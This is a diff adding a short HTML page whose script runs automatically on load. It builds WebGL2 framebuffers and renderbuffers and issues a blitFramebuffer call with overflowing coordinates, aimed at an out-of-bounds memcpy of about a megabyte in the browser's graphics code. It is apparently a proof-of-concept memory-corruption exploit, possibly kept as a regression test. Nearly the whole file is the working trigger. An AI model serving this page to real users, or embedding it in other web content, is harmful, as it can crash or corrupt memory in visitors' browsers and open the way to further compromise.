@@ -1,0 +1,25 @@
+<html><head><script>
+function corrupt()
+{
+    let c = document.createElement("canvas");
+    document.body.appendChild(c);
+    let gl = c.getContext("webgl2");
+
+    var length = 0x100000                     //  memcpy(dst, src, {length});
+    var rfb = gl.createFramebuffer();
+    var dfb = gl.createFramebuffer();
+    var rb = gl.createRenderbuffer();
+    var rb2 = gl.createRenderbuffer();
+    gl.bindFramebuffer(gl.READ_FRAMEBUFFER, rfb);
+    gl.bindFramebuffer(gl.DRAW_FRAMEBUFFER, dfb);
+    gl.bindRenderbuffer(gl.RENDERBUFFER, rb);
+    gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH24_STENCIL8, 0x1000, 2);
+    gl.bindRenderbuffer(gl.RENDERBUFFER, rb2);
+    gl.renderbufferStorage(gl.RENDERBUFFER, gl.DEPTH24_STENCIL8, 2, 2);
+    gl.framebufferRenderbuffer(gl.READ_FRAMEBUFFER, gl.DEPTH_STENCIL_ATTACHMENT, gl.RENDERBUFFER, rb);
+    gl.framebufferRenderbuffer(gl.DRAW_FRAMEBUFFER, gl.DEPTH_STENCIL_ATTACHMENT, gl.RENDERBUFFER, rb2);
+    gl.blitFramebuffer(1, 0, 0, 1, 1, 0, (2147483648 / 2) - (length / 4) + 1, 1, gl.DEPTH_BUFFER_BIT | gl.STENCIL_BUFFER_BIT, gl.NEAREST);
+}
+</script></head>
+<body onload=corrupt()>
+</body></html>
